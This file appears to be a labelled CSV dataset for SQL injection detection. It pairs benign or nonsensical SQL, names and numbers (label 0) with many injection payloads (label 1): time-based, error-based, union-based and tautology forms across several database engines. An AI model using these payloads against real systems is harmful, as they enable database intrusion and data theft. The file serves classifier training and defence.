Query,Label
waitfor delay '0:0:5' and ( '%' = ',1
"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",1
"1"" ) where 3958 = 3958 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM shown WHERE column NOT BETWEEN 'nuts' AND 'chance',0
c09so18,0
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
1 exec sp_ ( or exec xp_ ),1
"1' ) where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",1
"1'|| ( select 'ylek' where 3803 = 3803 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",1
1' and 4374 = 2305,1
"1%"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""%"" = """,1
"SELECT * FROM shirt WHERE contrast NOT IN ( 'got', 'receive', 'riding' )",0
66381379k,0
-5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ryvy' like 'ryvy,1
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0
' AND (SELECT LENGTH(database()))=12 --,1
SELECT again ( s ) FROM sets LEFT JOIN,0
15911,0
exec xp,1
chunshin,0
"iif ( 1539 = 1539,1539,1/0 )",1
SELECT column_name ( s ) FROM table2; SELECT City FROM Customers,0
"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",1
SELECT * FROM better WHERE cheese BETWEEN vertical09/01/1996hurried AND organized15/31/1996truck,0
"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'uzxr' = 'uzxr",1
SELECT hair ( s ) FROM attempt LEFT JOIN,0
SELECT * FROM attention WHERE famous LIKE '%floor%',0
tronchuda,0
-6081 where 3681 = 3681 or 2603 = 3138--,1
"1 ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 7200 = 7200",1
SELECT * FROM give WHERE leader NOT LIKE '[ever]%',0
"1'|| ( select 'wtdz' from dual where 1866 = 1866 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
brando@elsentidodelavida.lc,0
DELETE FROM if,0
SELECT * FROM rate WHERE same BETWEEN 'two' AND 'congress',0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'vjdk' like 'vjdk",1
-3750'+ ( select alpu where 3911 = 3911 order by 1--,1
-5229' ) ) as tkqp where 9253 = 9253 or 9323 = 9323#,1
on,0
"-4596"" union all select 5761#",1
"-3737%"" union all select 4452,4452,4452#",1
"SELECT * FROM find WHERE barn IN ( 'put', 'war', 'opinion' )",0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
"1"" ) as saqy where 9704 = 9704 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1
foixenc illanes,0
1' where 6583 = 6583,1
SELECT * FROM ranch WHERE instead = 'gas' OR travel = 'variety',0
1 ) ) as uadn where 9588 = 9588 rlike sleep ( 5 ) #,1
alfonso,0
1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- xwoo,1
1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#,1
"-9601' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT * FROM spin WHERE fence NOT LIKE '[master]%',0
"SELECT pleasant,excited,spend FROM arm LEFT JOIN Orders ON get.winID = rice.there ORDER BY community.work",0
SELECT option_value FROM wp_options WHERE option_name = '_site_transient_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,0
SELECT handle ( s ) FROM gold INNER JOIN,0
SELECT TOP 3 * FROM difficulty SELECT * FROM music 3SELECT * FROM mother,0
rebolledo de la torre,0
SELECT top FROM older UNION SELECT married FROM way ORDER BY airplane,0
beckwith,0
"1%"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""%"" = """,1
SELECT option_value FROM wp_options WHERE option_name = 'zcf_crm_oldversion_shortcodes' LIMIT 1,0
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'cgbf' like 'cgbf",1
"SELECT needed AS duck, fire AS [automobile] FROM throughout",0
-7770' where 6503 = 6503 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
"SELECT plates, factor+ ', ' + won+ ' ' + bush+ ', ' + drive AS would FROM central",0
1' ) where 5145 = 5145,1
"1' ) where 8125 = 8125 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"1"" waitfor delay '0:0:5' and ""syhx"" = ""syhx",1
"1 ) where 7571 = 7571 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
22468230j,0
-7600' or 7684 = 3181#,1
-2784 ) where 5261 = 5261 or 3472 = 1728#,1
5n37do,0
SELECT * FROM outer WHERE great BETWEEN doing09/01/1996kind AND image15/31/1996oxygen,0
"1 ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 1402 = 1402",1
SELECT * FROM actually,0
SELECT * FROM function WHERE object = end,0
2.51064E+15,0
87348482w,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr",1
ramells lam,0
"1%' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '",1
SELECT TOP 3 * FROM percent WHERE satisfied = 'pack' SELECT * FROM hill,0
"-1187' ) union all select 8202,8202,8202,8202,8202,8202,8202#",1
"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1
vallado oliveras,0
"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",1
"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1
"1"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""kkim"" = ""kkim",1
skylar,0
"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1
SELECT string FROM boy UNION SELECT bit FROM occur ORDER BY theory,0
SELECT * FROM ProductsWHERE Price BETWEEN 10 AND 20;,0
9.16233E+15,0
"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'yzdp' = 'yzdp",1
SELECT AVG ( closely ) FROM thank SELECT SUM ( knowledge ),0
39638,0
"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",1
SELECT dirty ( s ) FROM search SELECT who FROM think,0
ad0inist1ador9,0
"UPDATE essential SET hour = 'must', City = 'attempt' WHERE hidden = border",0
select ( case when ( 5390 = 7419 ) then 5390 else 5390* ( select 5390 from mysql.db ) end ) #,1
re681g48rdia,0
SELECT * FROM impossible WHERE money = 'by' OR fly = 'declared',0
"1%"" ) union all select null,null,null,null#",1
SELECT * FROM seven WHERE put BETWEEN 'constantly' AND 'effort',0
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",1
vadim,0
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%',0
SELECT * FROM birds 3,0
"1"" where 9014 = 9014 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",1
"-9996' or make_set ( 1237 = 7111,7111 )",1
"1"" ) where 7548 = 7548",1
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1
1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,1
"1%"" ) ) ) waitfor delay '0:0:5'--",1
SELECT AVG ( me ) FROM physical,0
17751,0
1 ) where 1013 = 1013 and 5573 = 9445#,1
1'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',1
ti20,0
"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""hcjz"" like ""hcjz",1
"1' ) where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT slabs ( s ) FROM pencil LEFT JOIN,0
1' where 2958 = 2958,1
select ( case when ( 1946 = 1302 ) then 1946 else 1/ ( select 0 ) end ) --,1
"1"" ) where 5850 = 5850 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1
SELECT COUNT ( DISTINCT pupil ) FROM movement,0
"-9583' ) ) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
"passeig bosc, 157",0
"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""%"" = """,1
368,0
byoung,0
SELECT CURTIME ( ) ;,0
select * from users where id = '1' or !<@ or 1 = 1 -- 1',1
SELECT vessels FROM of,0
select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master..sysdatabases ) end ) --,1
"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",1
SELECT * FROM snow WHERE Price NOT BETWEEN 10 AND 20,0
c28a3iz8,0
-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--,1
"1 ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-6851' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'csfx' = 'csfx",1
refriega,0
"SELECT * FROM dot WHERE either BETWEEN ""power"" AND ""wore""",0
UNION SELECT,1
"1%"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""%"" = """,1
"0"" encoding = ""utf-8"" ?> <_filter> <![CDATA[insert]]> </_filter> <_filter> <![CDATA[signup]]> </_filter> <_filter> <![CDATA[widget_login]]> </_filter> <a href = ""http://caritaskinshasa",0
SELECT * FROM glass WHERE slightly NOT LIKE '[cause]%',0
"1"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
olivio,0
SELECT * FROM [Brazil Customers]; CREATE PROCEDURE SelectAllCustomers AS,0
-7552 or 6872 = 6872,1
1 and 5934 = 7745,1
"1"" ) where 6679 = 6679 rlike sleep ( 5 ) #",1
jaazael,0
"-7295"" ) or 9323 = 9323#",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1
"1', ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1
"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
"1'+ ( select xlvq where 7470 = 7470 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1
SELECT TOP 3 * FROM freedom WHERE somewhere = 'acres',0
muriel de la fuente,0
"1' ) ) ) union all select null,null,null--",1
end and ( ( ( 'ycte' = 'ycte,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28313 ) ORDER BY meta_id ASC",0
jaca 75,0
"-7601"" ) ) ) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1
SELECT TOP 3 * FROM minerals WHERE nails = 'direction',0
ariel,0
"-8612' ) as toeu where 6357 = 6357 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"1' ) where 6387 = 6387 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.centralID ORDER BY Orders.deadID",0
SELECT ProductName FROM Products WHERE ProductID = ANY,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'qvoy' = 'qvoy",1
anjali,0
"1"" ) as uyns where 4751 = 4751 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1
SELECT * FROM ( SELECT while FROM kids ),0
"1"" where 5250 = 5250",1
"1%' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( '%' = '",1
SELECT * FROM agree WHERE NOT labor = 'action',0
"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"-1134"" union all select 4865,4865,4865,4865,4865#",1
FROM ( SELECT DISTINCT species FROM identity ),0
"SELECT instrument, month+ ', ' + brought+ ' ' + rest+ ', ' + yourself AS slipped FROM nodded",0
"1' ) where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"SELECT thrownID AS ID, beyond AS surprise FROM ought",0
1'+ ( select aqhj where 4419 = 4419,1
like,1
"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""snht"" = ""snht",1
"1' ) and make_set ( 6488 = 5525,5525 )",1
a' or 3 = 3--,1
"-5425 where 5933 = 5933 union all select 5933,5933,5933--",1
8708,0
if ( 9431 = 6730 ) select 9431 else drop function xbkh--,1
"1"" where 5440 = 5440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"1'+ ( select 'nhlx' where 2291 = 2291 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",1
SELECT COUNT ( sinkID ) FROM sudden,0
SELECT * FROM pay WHERE attention = 'sheep',0
"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""ycuo"" like ""ycuo",1
SELECT COUNT ( wild ) FROM made,0
sirevici,0
1 ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 7594 = 7594,1
"SELECT * FROM string WHERE stranger NOT IN ( 'swim', 'art', 'arrive' )",0
velero@softwaresaas.ec,0
SELECT TOP 3 * FROM lesson SELECT * FROM wire 3SELECT * FROM pupil,0
SELECT * FROM swung ORDER BY recent DESC,0
SELECT * FROM square WHERE aside NOT LIKE '[strange]%',0
"""a"""" or 3 = 3--""",1
SELECT * FROM lucky WHERE young = 'slide' OR many = 'twelve',0
6.79138E+15,0
6572,0
"select * from users where id = 1 -@<@ union select version ( ) ,version ( ) -- 1",1
"SELECT * FROM helpful ORDER BY new, new",0
"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""opdl"" = ""opdl",1
haenning@maxitienda.be,0
sobrecogimiento,0
1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,1
"-4983%"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,1
"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'quqx' = 'quqx",1
"-1512 union all select 9013,9013,9013,9013#",1
"1 ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 3504 = 3504",1
"1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1
SELECT * FROM search FETCH FIRST 3 ROWS ONLY,0
8589,0
"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'lgcw' = 'lgcw",1
claudio,0
SELECT AVG ( both ) FROM bring SELECT SUM ( herd ),0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1
1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt,1
"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
1'+ ( select naiw where 4924 = 4924,1
for26same8te,0
SELECT * FROM end 3 SELECT * FROM flag,0
"SELECT Orders.platesrID, Employees.sister, Employees.round FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.inID ORDER BY Orders.aliveID",0
SELECT AVG ( clothing ) FROM sign SELECT SUM ( known ),0
%27 or 1 = 1,1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",1
1' ) as mwpp where 6192 = 6192,1
SELECT * FROM bridge,0
camisoln,0
7u6can*i2a04n,0
SELECT TOP 3 * FROM several WHERE stomach = 'letter' SELECT * FROM any,0
ehrenfri,0
sols galcera,0
"SELECT DATE_FORMAT ( ""2017-06-15"", ""%Y"" ) ;",0
"SELECT his AS available, medicine AS [hope] FROM vegetable",0
"SELECT Employees.house, COUNT ( Orders.picturedID ) AS nationalFROM ( OrdersINNER JOIN series ON Orders.deeplyID = Employees.positionID )",0
"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'bxjo' like 'bxjo",1
"1%"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
"-9082 union all select 9858,9858,9858,9858,9858,9858--",1
SELECT relationship ( s ) FROM production FULL OUTER JOIN,0
